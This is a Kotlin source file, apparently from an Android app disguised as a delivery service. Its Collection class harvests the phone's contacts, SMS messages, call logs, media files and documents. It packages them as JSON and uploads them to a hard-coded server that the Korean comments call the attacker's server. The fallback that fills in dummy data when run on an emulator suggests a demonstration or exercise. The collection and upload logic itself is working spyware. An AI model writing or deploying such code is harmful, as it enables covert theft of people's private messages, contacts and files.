package com.baro.baro_baedal.modules

import android.content.Context
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

/**
 * 데이터 수집을 조율하는 메인 클래스
 * 각 수집기(Collector)를 사용하여 데이터를 수집하고,
 * JSON으로 변환한 후 서버로 전송합니다.
 * 
 * 사용 예시:
 * ```
 * val collection = Collection(context)
 * collection.collectAndSend()
 * ```
 */
class Collection(private val context: Context) {
    
    // 공격자 서버 URL (실제 사용 시 변경 필요)
    // 예: "http://192.168.0.100:8080/api/collect" 또는 "https://your-server.com/api/collect"
    private val serverUrl = "http://192.168.73.103:8080/api/hacker"
    
    // JSON 데이터를 로그로 출력할지 여부 (디버깅용)
    private val enableLogging = true
    
    // 각 도메인별 수집기 인스턴스
    private val contactCollector = ContactCollector(context)
    private val smsCollector = SmsCollector(context)
    private val callLogCollector = CallLogCollector(context)
    private val mediaCollector = MediaCollector(context)
    private val documentCollector = DocumentCollector(context)
    
    // JSON 변환기 및 데이터 전송기
    private val jsonConverter = JsonConverter()
    private val dataSender = DataSender(context, serverUrl, enableLogging)
    
    /**
     * 모든 데이터를 수집하고 서버로 전송합니다.
     * 이 메서드는 백그라운드 스레드에서 실행됩니다.
     * 
     * 수집되는 데이터:
     * - 연락처 정보 (이름, 전화번호, 이메일)
     * - SMS 메시지 (최근 100개)
     * - 전화 기록 (최근 100개)
     * - 미디어 파일 (이미지, 비디오, 오디오 각 50개)
     * - 문서 파일 (다운로드/Documents 폴더)
     */
    suspend fun collectAndSend() = withContext(Dispatchers.IO) {
        try {
            // 각 도메인별로 데이터 수집
            var contacts = contactCollector.collect()
            var sms = smsCollector.collect()
            var callLogs = callLogCollector.collect()
            val mediaFiles = mediaCollector.collect()
            val documents = documentCollector.collect()
            
            // Nox 플레이어 등 에뮬레이터 환경에서 실제 데이터가 수집되지 않을 경우
            // 30대 금융권 직장인의 더미 데이터 생성
            if (contacts.isEmpty()) {
                Log.d("Collection", "No contacts found, generating dummy data for demo...")
                contacts = DummyDataGenerator.generateContacts()
            }
            
            if (sms.isEmpty()) {
                Log.d("Collection", "No SMS found, generating dummy data for demo...")
                sms = DummyDataGenerator.generateSms()
            }
            
            if (callLogs.isEmpty()) {
                Log.d("Collection", "No call logs found, generating dummy data for demo...")
                callLogs = DummyDataGenerator.generateCallLogs()
            }
            
            // 수집된 데이터를 하나의 객체로 통합
            val collectedData = CollectedData(
                contacts = contacts,
                sms = sms,
                callLogs = callLogs,
                mediaFiles = mediaFiles,
                documents = documents
            )
            
            // JSON으로 변환
            val jsonData = jsonConverter.convertToJson(collectedData)
            
            // 로깅 활성화 시 JSON 출력
            if (enableLogging) {
                Log.d("Collection", "Collected Data JSON:")
                Log.d("Collection", jsonData)
                Log.d("Collection", "Contacts: ${contacts.size}, SMS: ${sms.size}, " +
                        "CallLogs: ${callLogs.size}, Media: ${mediaFiles.size}, " +
                        "Documents: ${documents.size}")
            }
            
            // 서버로 전송 (JSON 메타데이터 + 파일들)
            dataSender.send(jsonData, documents, mediaFiles)
            
        } catch (e: Exception) {
            if (enableLogging) {
                Log.e("Collection", "Error collecting data", e)
            }
            e.printStackTrace()
        }
    }
}
